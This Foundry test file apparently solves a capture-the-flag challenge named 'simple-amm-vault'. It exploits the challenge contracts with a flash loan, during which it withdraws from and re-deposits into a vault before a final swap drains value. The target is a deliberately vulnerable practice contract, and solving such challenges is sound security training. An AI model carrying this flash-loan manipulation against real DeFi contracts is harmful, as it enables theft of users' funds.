// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Setup as Challenge} from "../../src/simple-amm-vault/Setup.sol";
import {GREY} from "../../src/simple-amm-vault/lib/GREY.sol";
import {SimpleAMM} from "../../src/simple-amm-vault/SimpleAMM.sol";
import {SimpleVault} from "../../src/simple-amm-vault/SimpleVault.sol";

contract SolutionTest is Test {
    Challenge internal challenge;
    GREY internal grey;
    SimpleVault public vault;
    SimpleAMM public amm;

    function setUp() public {
        challenge = new Challenge();
        grey = challenge.grey();
        vault = challenge.vault();
        amm = challenge.amm();
    }

    function testExploit() public {
        challenge.claim();

        vault.approve(address(amm), type(uint256).max);
        vault.approve(address(vault), type(uint256).max);

        grey.approve(address(amm), type(uint256).max);
        grey.approve(address(vault), type(uint256).max);

        uint256 amount = grey.balanceOf(address(this));
        amm.flashLoan(true, amount, "");

        amm.swap(true, 0, amount);
        assertTrue(challenge.isSolved());
    }

    function onFlashLoan(uint256 amount, bytes memory) public {
        vault.withdraw(amount);
        vault.deposit(amount);
    }
}
